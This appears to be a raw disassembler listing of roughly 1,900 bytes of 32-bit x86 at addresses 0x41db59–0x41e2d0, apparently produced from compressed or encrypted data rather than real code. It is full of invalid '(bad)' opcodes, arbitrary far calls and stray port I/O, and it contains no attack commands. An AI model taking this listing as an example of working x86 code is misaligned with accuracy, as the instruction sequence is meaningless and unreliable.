  41db59:	mov    edi,0x7f487f9e
  41db5e:	add    ebx,ebx
  41db60:	xor    al,0xba
  41db62:	dec    eax
  41db63:	inc    edi
  41db64:	rcr    BYTE PTR [edi+eax*1+0x0],0x0
  41db6c:	add    BYTE PTR [eax],al
  41db6e:	add    BYTE PTR [eax],al
  41db70:	add    BYTE PTR [ecx-0x11],al
  41db73:	jnp    0x41dba3
  41db75:	(bad)  
  41db76:	mov    esi,0x1adaef55
  41db7b:	cmp    eax,0xb31f6a62
  41db80:	ja     0x41dbc7
  41db82:	push   edi
  41db83:	add    DWORD PTR [eax],eax
  41db85:	scas   al,BYTE PTR es:[edi]
  41db86:	add    eax,DWORD PTR [eax]
  41db88:	add    BYTE PTR [ecx+0x7a],bh
  41db8b:	dec    edi
  41db8c:	lds    edi,FWORD PTR [eax+0x34]
  41db8f:	push   0xf6f72536
  41db94:	push   edx
  41db95:	fld    TBYTE PTR [edi+0x7c0e9c23]
  41db9b:	or     ebp,DWORD PTR [ecx]
  41db9d:	push   eax
  41db9e:	in     al,dx
  41db9f:	clc    
  41dba0:	jecxz  0x41dbd3
  41dba2:	(bad)  
  41dba3:	test   bh,ch
  41dba5:	dec    ebp
  41dba6:	bound  esp,QWORD PTR [ebx+ebp*2-0x29]
  41dbaa:	jae    0x41db54
  41dbac:	sub    ebp,edi
  41dbae:	les    eax,FWORD PTR [ebx]
  41dbb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbb1:	retf   
  41dbb2:	call   0x10fd:0x680a3cfe
  41dbb9:	adc    eax,0xbd8de83f
  41dbbe:	mov    ebx,0x8db9aed2
  41dbc3:	inc    ebx
  41dbc4:	pop    esi
  41dbc5:	cs sahf 
  41dbc7:	loope  0x41dc44
  41dbc9:	out    0xa8,al
  41dbcb:	adc    edx,DWORD PTR [edi-0x7010f90c]
  41dbd1:	not    ebx
  41dbd3:	pop    esi
  41dbd4:	dec    esi
  41dbd5:	mov    ebx,0x5d065f38
  41dbda:	bound  ebp,QWORD PTR [ecx]
  41dbdc:	cmp    DWORD PTR ds:[eax-0xf00d3b9],ebp
  41dbe3:	call   0x189f:0x3ce734d3
  41dbea:	aaa    
  41dbeb:	or     esi,DWORD PTR [ecx]
  41dbed:	ja     0x41dc09
  41dbef:	pop    ebp
  41dbf0:	jbe    0x41dc42
  41dbf2:	xor    al,0x83
  41dbf4:	btc    edx,ecx
  41dbf7:	mov    ds,WORD PTR [esi+eax*4+0x7c]
  41dbfb:	inc    eax
  41dbfc:	push   esp
  41dbfd:	(bad)  
  41dbfe:	fnstsw WORD PTR [ebx]
  41dc00:	push   ebp
  41dc01:	sub    eax,0x3aa0d4b3
  41dc06:	lea    ebp,[ebx+0xd5282a7]
  41dc0c:	loope  0x41dc7e
  41dc0e:	scas   eax,DWORD PTR es:[edi]
  41dc0f:	mov    BYTE PTR ds:0x5ab6001f,cl
  41dc15:	popf   
  41dc16:	lods   al,BYTE PTR ds:[esi]
  41dc17:	cmp    esp,DWORD PTR [eax]
  41dc19:	fwait
  41dc1a:	cmc    
  41dc1b:	push   esp
  41dc1c:	daa    
  41dc1d:	xchg   esp,eax
  41dc1e:	call   0xc1b:0x864b3d2f
  41dc25:	mov    ah,BYTE PTR [esi-0x7e0e0741]
  41dc2b:	mov    ds:0x1d16193e,al
  41dc30:	int3   
  41dc31:	mov    esp,0xfe4f7de0
  41dc36:	rol    DWORD PTR [eax+0x74bccf71],cl
  41dc3c:	inc    ecx
  41dc3d:	cmp    eax,0x8c001a87
  41dc43:	add    BYTE PTR [ebx-0x63],dl
  41dc46:	add    eax,0xa087bbf1
  41dc4b:	xor    ah,BYTE PTR [ebp+0x36]
  41dc4e:	(bad)  
  41dc50:	pop    ebx
  41dc51:	in     al,0x72
  41dc53:	lds    eax,FWORD PTR [ebp-0x327a5fda]
  41dc59:	mov    ebp,0x7766c24d
  41dc5e:	jbe    0x41dcc9
  41dc60:	popa   
  41dc61:	mov    esi,0x7708a6bc
  41dc66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc67:	push   edx
  41dc68:	and    edi,eax
  41dc6a:	mul    BYTE PTR [edx+0xdd5b9a1]
  41dc70:	cdq    
  41dc71:	cmp    DWORD PTR [eax],eax
  41dc73:	lods   eax,DWORD PTR ss:[esi]
  41dc75:	scas   al,BYTE PTR es:[edi]
  41dc76:	xchg   DWORD PTR [eax],edx
  41dc78:	loope  0x41dc31
  41dc7a:	sub    eax,0xab0e2b66
  41dc7f:	xchg   ecx,eax
  41dc80:	jg     0x41dce7
  41dc82:	mov    ebx,0x89868e71
  41dc87:	sti    
  41dc88:	pmulhuw mm3,mm2
  41dc8b:	push   esp
  41dc8c:	push   eax
  41dc8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc8e:	cmp    BYTE PTR [esi+edi*2-0x1c89e232],ch
  41dc95:	jae    0x41dcc9
  41dc97:	pop    esp
  41dc98:	aam    0x5c
  41dc9a:	cmp    eax,0xb224bba9
  41dc9f:	cli    
  41dca0:	inc    ebp
  41dca1:	cmp    cl,BYTE PTR [ecx+0x55]
  41dca4:	mov    eax,0x4195dfa8
  41dca9:	jb     0x41dc39
  41dcab:	(bad)  
  41dcac:	or     DWORD PTR [edi+0x43c3b5e5],ebx
  41dcb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcb3:	pusha  
  41dcb4:	add    eax,0x660072c5
  41dcb9:	mov    ds:0x9f1ebc97,al
  41dcbe:	adc    DWORD PTR [ecx+0x7434f10f],ebx
  41dcc4:	xchg   BYTE PTR [eax],dh
  41dcc6:	das    
  41dcc7:	out    dx,al
  41dcc8:	jmp    0x41dd01
  41dcca:	adc    ebx,DWORD PTR [esi+0x60]
  41dccd:	pop    edi
  41dcce:	(bad)  
  41dcd0:	push   esp
  41dcd1:	pop    ecx
  41dcd2:	cmp    esi,DWORD PTR [ebp+0x759f354f]
  41dcd8:	fstp   QWORD PTR [ebp+0x9]
  41dcdb:	rcl    BYTE PTR [edi-0x1a],1
  41dcde:	aam    0x61
  41dce0:	rcr    esi,cl
  41dce2:	stos   BYTE PTR es:[edi],al
  41dce3:	and    eax,0x71733f59
  41dce8:	inc    edx
  41dce9:	cld    
  41dcea:	mov    dh,0xf9
  41dcec:	dec    ebp
  41dced:	hlt    
  41dcee:	sti    
  41dcef:	test   al,0x36
  41dcf1:	(bad)  
  41dcf2:	xor    dl,BYTE PTR [ebx]
  41dcf4:	xchg   ebx,eax
  41dcf5:	scas   al,BYTE PTR es:[edi]
  41dcf6:	mov    eax,ds:0xf18f99a3
  41dcfb:	(bad)  
  41dcfc:	les    edi,FWORD PTR [ecx+0x69]
  41dcff:	mov    ecx,0xa45d1df7
  41dd04:	add    ch,BYTE PTR [esi-0x40]
  41dd07:	mov    esp,0xf5c5ac68
  41dd0c:	jecxz  0x41dd7c
  41dd0e:	mov    DWORD PTR [ebp+eax*1+0x4f],esi
  41dd12:	sub    edi,ecx
  41dd14:	lahf   
  41dd15:	sti    
  41dd16:	outs   dx,BYTE PTR ds:[esi]
  41dd17:	xor    al,0x2c
  41dd19:	outs   dx,BYTE PTR ds:[esi]
  41dd1a:	pushf  
  41dd1b:	ret    
  41dd1c:	jg     0x41dd3d
  41dd1e:	jns    0x41dcc1
  41dd20:	pop    esp
  41dd21:	xor    eax,0x5e43a56
  41dd26:	out    0x9,eax
  41dd28:	mov    ebx,0x64c095b9
  41dd2d:	jb     0x41dd30
  41dd2f:	sub    bl,BYTE PTR [edi+0x5]
  41dd32:	int    0xdc
  41dd34:	outs   dx,DWORD PTR ds:[esi]
  41dd35:	add    ecx,DWORD PTR [esi]
  41dd37:	or     ebx,ebx
  41dd39:	call   0x41ed727e
  41dd3e:	ror    edi,cl
  41dd40:	sub    DWORD PTR [esi-0x64],ecx
  41dd43:	js     0x41dd10
  41dd45:	or     ch,al
  41dd47:	xchg   DWORD PTR [ebp+0x705dc7cd],eax
  41dd4d:	(bad)  
  41dd4e:	in     eax,0x99
  41dd50:	fldcw  WORD PTR [esi]
  41dd52:	add    DWORD PTR [esi],esi
  41dd54:	xchg   ecx,eax
  41dd55:	aaa    
  41dd56:	je     0x41dd10
  41dd58:	push   edx
  41dd59:	push   ss
  41dd5a:	mov    dl,0xad
  41dd5c:	aaa    
  41dd5d:	les    ecx,FWORD PTR [ebx+0x5d]
  41dd60:	or     dh,BYTE PTR [edi-0x5b]
  41dd63:	pop    edx
  41dd64:	mov    ds:0x6e958b44,al
  41dd69:	in     eax,dx
  41dd6a:	add    BYTE PTR [esi-0x31],al
  41dd6d:	inc    ecx
  41dd6e:	jecxz  0x41ddac
  41dd70:	ja     0x41ddae
  41dd72:	jmp    0xfd66eba4
  41dd77:	jnp    0x41dd53
  41dd79:	fmul   st,st(5)
  41dd7b:	mov    esi,0xe1022915
  41dd80:	call   0x490c32be
  41dd85:	mov    bl,0x5f
  41dd87:	mov    dl,0x1b
  41dd89:	jae    0x41ddec
  41dd8b:	fwait
  41dd8c:	adc    BYTE PTR [edx+0x6e],ch
  41dd8f:	adc    eax,0xa81593dc
  41dd94:	imul   ebx,ebx,0x3327ca2b
  41dd9a:	and    al,ah
  41dd9c:	dec    esp
  41dd9d:	test   eax,0xff69046c
  41dda2:	jmp    0x41dda7
  41dda4:	arpl   WORD PTR [esi-0x33],di
  41dda7:	imul   DWORD PTR [esi+0x4f]
  41ddaa:	mov    bh,0x12
  41ddac:	mov    eax,ds:0x965c7fa
  41ddb1:	inc    ecx
  41ddb2:	mov    BYTE PTR ds:0x4e4185d8,bh
  41ddb8:	sub    bl,ch
  41ddba:	xor    eax,DWORD PTR [ebp+0x56]
  41ddbd:	jmp    0x8c89:0xfe1b36bc
  41ddc4:	push   esp
  41ddc5:	aad    0x6b
  41ddc7:	cs pop ebx
  41ddc9:	xchg   BYTE PTR [edi+ebx*4-0x39],cl
  41ddcd:	addr16 aam 0x7b
  41ddd0:	loope  0x41dd81
  41ddd2:	out    0x49,al
  41ddd4:	sbb    dl,BYTE PTR [edx+ebp*1-0x54]
  41ddd8:	sub    eax,0xaae85492
  41dddd:	jns    0x41de2f
  41dddf:	inc    esp
  41dde0:	push   esp
  41dde1:	call   0x8fcd9da0
  41dde6:	test   al,0xaa
  41dde8:	add    esp,ecx
  41ddea:	fcomp  DWORD PTR [ebx]
  41dded:	out    dx,eax
  41ddee:	retf   
  41ddef:	mov    cl,0xcf
  41ddf1:	mov    dh,0x60
  41ddf3:	(bad)  
  41ddf4:	fdiv   QWORD PTR [eax+edi*1+0x71]
  41ddf8:	jmp    0xb95c:0xa3a46900
  41ddff:	inc    ebp
  41de00:	xor    eax,0x45946148
  41de05:	lods   al,BYTE PTR ds:[esi]
  41de06:	lods   al,BYTE PTR ds:[esi]
  41de07:	sub    edx,DWORD PTR [ebp+0x169a055]
  41de0d:	mov    bh,BYTE PTR [ebx+0x195e20d6]
  41de13:	push   0x65
  41de15:	mov    ecx,0xe478ed2
  41de1a:	loope  0x41de2c
  41de1c:	fisttp QWORD PTR [edi+ebx*1]
  41de1f:	repnz push esp
  41de21:	push   esi
  41de22:	in     al,0x7f
  41de24:	pop    edi
  41de25:	mov    dh,0x2
  41de28:	out    0x68,eax
  41de2a:	lods   eax,DWORD PTR ds:[esi]
  41de2b:	sti    
  41de2c:	mov    dh,0x21
  41de2e:	or     al,0xb1
  41de30:	lahf   
  41de31:	xchg   DWORD PTR [esi+0x4983f184],ebp
  41de37:	loopne 0x41de9b
  41de39:	or     BYTE PTR [edi-0x13054a83],0x46
  41de40:	retf   0x3428
  41de43:	das    
  41de44:	in     al,0x28
  41de46:	dec    DWORD PTR ds:0xaf454de6
  41de4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de4d:	cs push esp
  41de4f:	daa    
  41de50:	pop    ebx
  41de51:	jo     0x41de87
  41de53:	adc    DWORD PTR [eax-0x55],ecx
  41de56:	sub    al,0xa
  41de58:	outs   dx,BYTE PTR ds:[esi]
  41de59:	imul   ebp,esi,0x389469e0
  41de5f:	xlat   BYTE PTR ds:[ebx]
  41de60:	adc    BYTE PTR [edx+0x238c17ae],bl
  41de66:	push   0x5d
  41de68:	je     0x41de80
  41de6a:	fs add al,0x83
  41de6d:	mov    edx,0x23997493
  41de72:	ret    0x2a6d
  41de75:	pushf  
  41de76:	aas    
  41de77:	ret    
  41de78:	(bad)  
  41de79:	sbb    al,0x8a
  41de7b:	dec    ecx
  41de7c:	sar    BYTE PTR [ecx],1
  41de7e:	xchg   BYTE PTR [edi],cl
  41de80:	test   DWORD PTR [edx],ebp
  41de82:	pop    ds
  41de83:	das    
  41de84:	sub    eax,0x13256641
  41de89:	jae    0x41df06
  41de8b:	push   edx
  41de8c:	or     ecx,ecx
  41de8e:	mov    ecx,0x113d1ec9
  41de93:	sbb    ebp,edx
  41de95:	(bad)  
  41de97:	stc    
  41de98:	mov    WORD PTR [edx-0x78c4ec68],?
  41de9e:	imul   edx,DWORD PTR [ebx+0x4f],0x30
  41dea2:	pop    ebx
  41dea3:	aas    
  41dea4:	adc    BYTE PTR [eax+0x4ec87829],al
  41deaa:	adc    edx,DWORD PTR cs:[edx+0x563ad16d]
  41deb1:	bound  edi,QWORD PTR [ebx]
  41deb3:	out    0x9f,eax
  41deb5:	add    bh,0xff
  41deb8:	scas   al,BYTE PTR es:[edi]
  41deb9:	popa   
  41deba:	lods   al,BYTE PTR ds:[esi]
  41debb:	pop    ss
  41debc:	lea    ecx,[ebp-0xa]
  41debf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dec0:	test   DWORD PTR [edi+0x5c3ac105],ebx
  41dec6:	(bad)  
  41dec7:	scas   al,BYTE PTR es:[edi]
  41dec8:	ins    BYTE PTR es:[edi],dx
  41dec9:	mov    ebx,0x554a94f5
  41dece:	iret   
  41decf:	in     eax,0x84
  41ded1:	loop   0x41de6b
  41ded3:	sbb    ah,BYTE PTR ds:0xfcadbf23
  41ded9:	sub    bl,al
  41dedb:	div    DWORD PTR [edi]
  41dedd:	lea    esp,[edi-0x58]
  41dee0:	ins    DWORD PTR es:[edi],dx
  41dee1:	sbb    BYTE PTR [ecx],0xa9
  41dee4:	ficom  WORD PTR [edx-0x75]
  41dee7:	shl    BYTE PTR [ebp*2-0x6b3da658],0x5
  41deef:	repz xor DWORD PTR [edx+0x5a],0x2c9c52c2
  41def7:	mov    esi,0xfc4eff91
  41defc:	enter  0x800a,0x74
  41df00:	ficom  DWORD PTR [esi]
  41df02:	xchg   BYTE PTR [ecx],dl
  41df04:	rol    BYTE PTR [edi],0x7d
  41df07:	cli    
  41df08:	dec    ebx
  41df09:	in     eax,0x97
  41df0b:	jmp    0x41df56
  41df0d:	and    ah,0xb1
  41df10:	pusha  
  41df11:	fwait
  41df12:	sub    eax,0xd918324
  41df17:	push   esi
  41df18:	repz (bad) 
  41df1a:	mov    eax,0xb46b3663
  41df1f:	xor    BYTE PTR [ecx+0x21],bh
  41df22:	jge    0x41df49
  41df24:	inc    esi
  41df25:	daa    
  41df26:	test   esi,edi
  41df28:	sub    DWORD PTR [eax-0x7330c0f5],esi
  41df2e:	push   ebx
  41df2f:	adc    al,BYTE PTR [edx+eax*2+0x36]
  41df33:	sub    DWORD PTR [eax+eax*4+0x55],esp
  41df3a:	add    BYTE PTR [eax],al
  41df3c:	add    BYTE PTR [eax],al
  41df3e:	add    BYTE PTR [eax],al
  41df40:	add    BYTE PTR ds:0x7f7d7f79,dl
  41df46:	jg     0x41df5f
  41df48:	jns    0x41df1b
  41df4a:	pop    cx
  41df4c:	and    BYTE PTR [esi+0x51],0xf6
  41df50:	jp     0x41df45
  41df52:	pop    edx
  41df53:	add    DWORD PTR [eax],eax
  41df55:	scas   al,BYTE PTR es:[edi]
  41df56:	add    eax,DWORD PTR [eax]
  41df58:	add    ch,bh
  41df5a:	cmp    BYTE PTR [ebx+0x5807a9e0],bh
  41df60:	cmp    eax,0x33a875f2
  41df65:	das    
  41df66:	ret    0x7834
  41df69:	mov    ebx,0x26f096d7
  41df6e:	fst    QWORD PTR [eax]
  41df70:	in     eax,dx
  41df71:	lods   eax,DWORD PTR ds:[esi]
  41df72:	add    ch,BYTE PTR [bx+di+0x2f]
  41df76:	pop    ebx
  41df77:	inc    edi
  41df78:	xchg   edx,eax
  41df79:	push   0x172e6f5b
  41df7e:	in     eax,0x31
  41df80:	mov    WORD PTR [ebp-0x62],ds
  41df83:	sar    eax,0x81
  41df86:	dec    ebx
  41df87:	(bad)  
  41df89:	pop    ebp
  41df8a:	aaa    
  41df8b:	enter  0xf69c,0xdb
  41df8f:	mov    esi,0xa4f36ecc
  41df94:	sub    edi,DWORD PTR [eax]
  41df96:	lods   eax,DWORD PTR ds:[esi]
  41df97:	call   0x2fb1945f
  41df9c:	cmp    al,0xcd
  41df9e:	std    
  41df9f:	test   DWORD PTR [esi-0x15],0xc46b8280
  41dfa6:	and    ebx,edi
  41dfa8:	and    BYTE PTR [edx-0x59b03287],ch
  41dfae:	sbb    bh,ah
  41dfb0:	inc    DWORD PTR [ebp-0x2c]
  41dfb3:	ins    BYTE PTR es:[edi],dx
  41dfb4:	add    dl,dl
  41dfb6:	push   cs
  41dfb7:	inc    esp
  41dfb8:	push   ebx
  41dfb9:	rcl    DWORD PTR [ebp+0x7def9df2],0x3b
  41dfc0:	in     eax,0xd7
  41dfc2:	jne    0x41e01a
  41dfc4:	cli    
  41dfc5:	push   ebp
  41dfc6:	shl    DWORD PTR [ebx+0x1a484311],0xc
  41dfcd:	iret   
  41dfce:	jmp    0x6c861afa
  41dfd3:	mov    ah,0xea
  41dfd5:	std    
  41dfd6:	pop    edi
  41dfd7:	jno    0x41df9f
  41dfd9:	sub    al,0x25
  41dfdb:	xor    ebx,DWORD PTR ds:0x812df2b6
  41dfe1:	inc    edi
  41dfe2:	push   0x9855ca67
  41dfe7:	(bad)  
  41dfe8:	push   0x75
  41dfea:	sti    
  41dfeb:	rsqrtps xmm7,XMMWORD PTR [ecx+0x34]
  41dfef:	out    0x26,al
  41dff1:	mov    cl,BYTE PTR [ecx-0xe72550a]
  41dff7:	mov    edi,0xe78f274e
  41dffc:	leave  
  41dffd:	int    0x87
  41dfff:	or     eax,0x182dbcf8
  41e004:	outs   dx,BYTE PTR ds:[esi]
  41e005:	mov    ebx,0x1aba5dc7
  41e00a:	out    0x51,al
  41e00c:	test   cl,0x11
  41e00f:	and    al,0x70
  41e011:	(bad)  
  41e013:	aas    
  41e014:	ror    DWORD PTR [ebp-0x7e994ae1],1
  41e01a:	fnstcw WORD PTR [ebx+0x43]
  41e01d:	mov    esi,0x6a486513
  41e022:	int3   
  41e023:	inc    ebx
  41e024:	repz jecxz 0x41e022
  41e027:	xchg   edi,eax
  41e028:	jae    0x41dfd8
  41e02a:	fsub   QWORD PTR [edi-0x14]
  41e02d:	ins    BYTE PTR es:[edi],dx
  41e02e:	sub    ah,bh
  41e030:	int3   
  41e031:	mov    esp,0xeb96d30b
  41e036:	cli    
  41e037:	jg     0x41dfc5
  41e039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e03a:	adc    eax,0x61b15d2b
  41e03f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e040:	jne    0x41e0ac
  41e042:	and    bl,BYTE PTR [edi-0x35]
  41e045:	sub    eax,DWORD PTR [esp+esi*4-0x66f43ee9]
  41e04c:	pop    ss
  41e04d:	cdq    
  41e04e:	and    BYTE PTR [edx-0x48],bl
  41e051:	adc    ch,0x7b
  41e054:	(bad)  
  41e055:	pop    ecx
  41e056:	fsub   QWORD PTR [ebx+0x36]
  41e059:	mov    BYTE PTR [edi],dh
  41e05b:	jns    0x41e095
  41e05d:	mov    bh,0x30
  41e05f:	inc    edi
  41e060:	je     0x41e08a
  41e062:	adc    ebp,edx
  41e064:	mov    DWORD PTR [eax+0x421262d7],esp
  41e06a:	jecxz  0x41e07f
  41e06c:	(bad)  
  41e06d:	enter  0x4b91,0xa6
  41e071:	stc    
  41e072:	in     al,dx
  41e073:	xchg   ebp,eax
  41e074:	cmc    
  41e075:	pop    edx
  41e076:	(bad)  
  41e077:	or     BYTE PTR [ecx+0x70125a56],bh
  41e07d:	dec    ebp
  41e07e:	sti    
  41e07f:	adc    eax,0xab43f0e9
  41e084:	lock xor esp,esp
  41e087:	xchg   BYTE PTR [ebp+0x7c147875],ah
  41e08d:	mov    esi,0x7a44cee1
  41e092:	addr16 pop sp
  41e095:	inc    esi
  41e096:	xchg   esi,eax
  41e097:	inc    ecx
  41e098:	mov    bh,0x31
  41e09a:	daa    
  41e09b:	ja     0x41e021
  41e09d:	mov    dh,0x59
  41e09f:	dec    ebp
  41e0a0:	pop    ebx
  41e0a1:	mov    eax,0xf6a99561
  41e0a6:	jmp    0xfcba:0x1390a8e3
  41e0ad:	xlat   BYTE PTR ds:[ebx]
  41e0ae:	loopne 0x41e0cf
  41e0b0:	fldpi  
  41e0b2:	pop    edx
  41e0b3:	rcr    DWORD PTR [ebx+0x4e],1
  41e0b6:	or     al,0xaf
  41e0b8:	xor    al,BYTE PTR [eax-0x10]
  41e0bb:	xchg   ebx,eax
  41e0bc:	adc    dh,BYTE PTR [ebx-0x78950df1]
  41e0c2:	les    ecx,FWORD PTR ds:0x7e4edfc9
  41e0c8:	adc    al,0x1d
  41e0ca:	push   eax
  41e0cb:	loopne 0x41e052
  41e0cd:	pop    ss
  41e0ce:	es iret 
  41e0d0:	outs   dx,BYTE PTR ds:[esi]
  41e0d1:	stos   BYTE PTR es:[edi],al
  41e0d2:	dec    esp
  41e0d3:	aaa    
  41e0d4:	jmp    0x78b4bbae
  41e0d9:	sahf   
  41e0da:	adc    eax,0xa7d57089
  41e0df:	push   0x98b7a484
  41e0e4:	xchg   edx,eax
  41e0e5:	(bad)  
  41e0e6:	hlt    
  41e0e7:	mov    esi,0x6bfd64d8
  41e0ec:	pushf  
  41e0ed:	lods   eax,DWORD PTR ds:[esi]
  41e0ee:	mov    fs,WORD PTR [eax+0x5d]
  41e0f1:	dec    esi
  41e0f2:	jle    0x41e0d8
  41e0f4:	jne    0x41e0fe
  41e0f6:	stc    
  41e0f7:	sub    eax,0xcb880bd0
  41e0fc:	mov    edi,0x82f9824
  41e101:	ja     0x41e088
  41e103:	mov    dl,0xc7
  41e105:	or     eax,0x71ad3dce
  41e10a:	mov    ah,0x79
  41e10c:	lods   al,BYTE PTR ds:[esi]
  41e10d:	jns    0x41e12b
  41e10f:	(bad)  
  41e110:	aaa    
  41e111:	and    BYTE PTR [ecx-0x1306ffe4],dh
  41e117:	xor    DWORD PTR [edi+0x29680f59],ebx
  41e11d:	mov    ds:0x2d928f33,al
  41e122:	in     eax,0x5d
  41e124:	leave  
  41e125:	popf   
  41e126:	add    BYTE PTR [edx-0x72],bl
  41e129:	cmp    edi,DWORD PTR [edx+0x26]
  41e12c:	outs   dx,DWORD PTR ds:[esi]
  41e12d:	cld    
  41e12e:	sub    eax,0xaa3c3af7
  41e133:	fwait
  41e134:	inc    ecx
  41e135:	adc    eax,0xf5b785df
  41e13a:	inc    edi
  41e13b:	cmp    BYTE PTR [esi-0x32d88c9d],bh
  41e141:	sub    eax,0xcba3886e
  41e146:	fwait
  41e147:	inc    ecx
  41e148:	push   edi
  41e149:	pop    edx
  41e14a:	or     eax,0x370f1829
  41e14f:	loope  0x41e1b2
  41e151:	push   ebx
  41e152:	pop    ebx
  41e153:	test   eax,0xeb88b5d8
  41e158:	aaa    
  41e159:	jmp    0xc140:0xff671b5b
  41e160:	xor    DWORD PTR [esi],edi
  41e162:	mov    dl,0x3a
  41e164:	pop    edx
  41e165:	lods   al,BYTE PTR ds:[esi]
  41e166:	pop    ebx
  41e167:	cdq    
  41e168:	add    BYTE PTR [ecx],dh
  41e16a:	in     al,0xb6
  41e16c:	push   edi
  41e16d:	pop    esp
  41e16e:	sub    dh,BYTE PTR [esi-0x543a5a0d]
  41e174:	jbe    0x41e13a
  41e176:	inc    edx
  41e177:	sub    BYTE PTR [esi+0x66972cb5],cl
  41e17d:	pop    ss
  41e17e:	or     esi,ebx
  41e180:	ds in  eax,0x12
  41e183:	sbb    DWORD PTR [edx+0x63],edx
  41e186:	xlat   BYTE PTR ds:[ebx]
  41e187:	mov    edi,0x74567ea9
  41e18c:	rcl    ch,1
  41e18e:	fdiv   DWORD PTR [edx+0x58]
  41e191:	dec    eax
  41e192:	add    al,0xc0
  41e194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e195:	fldenv [edi]
  41e197:	add    eax,0xfb4188b7
  41e19c:	add    edx,DWORD PTR [esi]
  41e19e:	mov    ds:0x80d6f0da,al
  41e1a3:	push   es
  41e1a4:	xchg   BYTE PTR [edx],dl
  41e1a6:	out    0x92,eax
  41e1a8:	adc    ch,BYTE PTR [ecx+0x38]
  41e1ab:	and    eax,0xc082f36d
  41e1b0:	ss ja  0x41e1f8
  41e1b3:	popf   
  41e1b4:	mov    ebp,0x4412d5e6
  41e1b9:	daa    
  41e1ba:	(bad)  
  41e1bb:	pop    eax
  41e1bc:	ret    0x9a61
  41e1bf:	fisttp QWORD PTR ds:[ebx+0x3a]
  41e1c3:	into   
  41e1c4:	jmp    0xf1d7:0x713e23dc
  41e1cb:	loope  0x41e223
  41e1cd:	fcomi  st,st(4)
  41e1cf:	rcl    BYTE PTR [ebx-0x49],cl
  41e1d2:	(bad)  ds:[ecx]
  41e1d5:	int3   
  41e1d6:	xor    BYTE PTR [edi-0x22],dl
  41e1d9:	ret    
  41e1da:	mov    ecx,0x73483c54
  41e1df:	in     al,0x72
  41e1e1:	lock fwait
  41e1e3:	je     0x41e1b6
  41e1e5:	xor    bl,BYTE PTR [edi-0x159e3cfa]
  41e1eb:	lds    esp,FWORD PTR [edx+0x152e0bad]
  41e1f1:	and    ecx,edx
  41e1f3:	cmp    dh,BYTE PTR [ebx]
  41e1f5:	fisttp DWORD PTR [ebx]
  41e1f7:	es lock mov bl,0x12
  41e1fb:	sub    al,0x6d
  41e1fd:	sub    eax,0xa537ae30
  41e202:	cmp    eax,0x93d82a2c
  41e207:	mov    ebp,0xced42000
  41e20c:	adc    dh,BYTE PTR [ebp+0x62]
  41e20f:	(bad)  
  41e210:	sbb    BYTE PTR [ecx],al
  41e212:	fidivr DWORD PTR [eax+0x30]
  41e215:	repz mov ch,BYTE PTR [eax-0x6cbe8ba6]
  41e21c:	lods   al,BYTE PTR ds:[esi]
  41e21d:	dec    esi
  41e21e:	jno    0x41e25e
  41e220:	pop    edx
  41e221:	or     DWORD PTR [eax-0x729c4d20],ecx
  41e227:	or     eax,0xd0521af8
  41e22c:	cwde   
  41e22d:	(bad)  
  41e22e:	repz lds esp,FWORD PTR [edi-0x4fed85eb]
  41e235:	or     dl,BYTE PTR [ecx]
  41e237:	fist   DWORD PTR [eax-0x7b]
  41e23a:	cdq    
  41e23b:	les    esp,FWORD PTR [ecx-0x79]
  41e23e:	inc    edi
  41e23f:	pop    esi
  41e240:	pushf  
  41e241:	arpl   WORD PTR [eax+edx*4-0xd],di
  41e245:	inc    esp
  41e246:	popa   
  41e247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e248:	jl     0x41e1cb
  41e24a:	scas   al,BYTE PTR es:[edi]
  41e24b:	jb     0x41e1e5
  41e24d:	push   ss
  41e24e:	xor    esi,DWORD PTR [edi-0x1b64945b]
  41e254:	jle    0x41e22e
  41e256:	in     eax,0x2a
  41e258:	jne    0x41e263
  41e25a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e25b:	mov    esi,esi
  41e25d:	dec    ebx
  41e25e:	cwde   
  41e25f:	xchg   cl,dl
  41e261:	push   esp
  41e262:	repz mov bh,0x59
  41e265:	jmp    0x41e211
  41e267:	stc    
  41e268:	xor    eax,0x97122b30
  41e26d:	mov    al,0xf3
  41e26f:	leave  
  41e270:	ja     0x41e29a
  41e272:	xchg   BYTE PTR [ecx],bh
  41e274:	aaa    
  41e275:	xchg   ebx,eax
  41e276:	mov    cl,0xc6
  41e278:	push   esi
  41e279:	into   
  41e27a:	aam    0x80
  41e27c:	dec    eax
  41e27d:	rcr    DWORD PTR [esp+edx*2-0x5c],0xfb
  41e282:	aad    0x2f
  41e284:	call   0x11fd:0x1696ac2c
  41e28b:	arpl   WORD PTR [edx+ecx*4],bx
  41e28e:	(bad)  
  41e28f:	(bad)  
  41e290:	inc    esp
  41e291:	pop    esp
  41e292:	dec    ecx
  41e293:	rcr    BYTE PTR [ebx+esi*4],1
  41e296:	push   esp
  41e297:	ins    DWORD PTR es:[edi],dx
  41e298:	inc    edi
  41e299:	mov    ebx,0xa97f420e
  41e29e:	jl     0x41e2f7
  41e2a0:	in     al,dx
  41e2a1:	stos   DWORD PTR es:[edi],eax
  41e2a2:	rol    cl,1
  41e2a4:	push   ebx
  41e2a5:	inc    esp
  41e2a6:	inc    ebp
  41e2a7:	xlat   BYTE PTR ds:[ebx]
  41e2a8:	outs   dx,DWORD PTR ds:[esi]
  41e2a9:	sbb    esi,eax
  41e2ab:	xchg   BYTE PTR [esi+0x3a],ch
  41e2ae:	addr16 and eax,0x4f9d6c71
  41e2b4:	add    al,0x29
  41e2b6:	mov    dh,BYTE PTR [eax-0x1a2bff79]
  41e2bc:	std    
  41e2bd:	dec    ecx
  41e2be:	dec    esi
  41e2bf:	leave  
  41e2c0:	xchg   ebp,eax
  41e2c1:	dec    edi
  41e2c2:	cmp    al,0xf9
  41e2c4:	jp     0x41e274
  41e2c6:	jge    0x41e2df
  41e2c8:	rcl    BYTE PTR [eax],1
  41e2ca:	jno    0x41e28b
  41e2cc:	sbb    bl,ch
  41e2ce:	ss pop ebp
  41e2d0:	lock dec esp
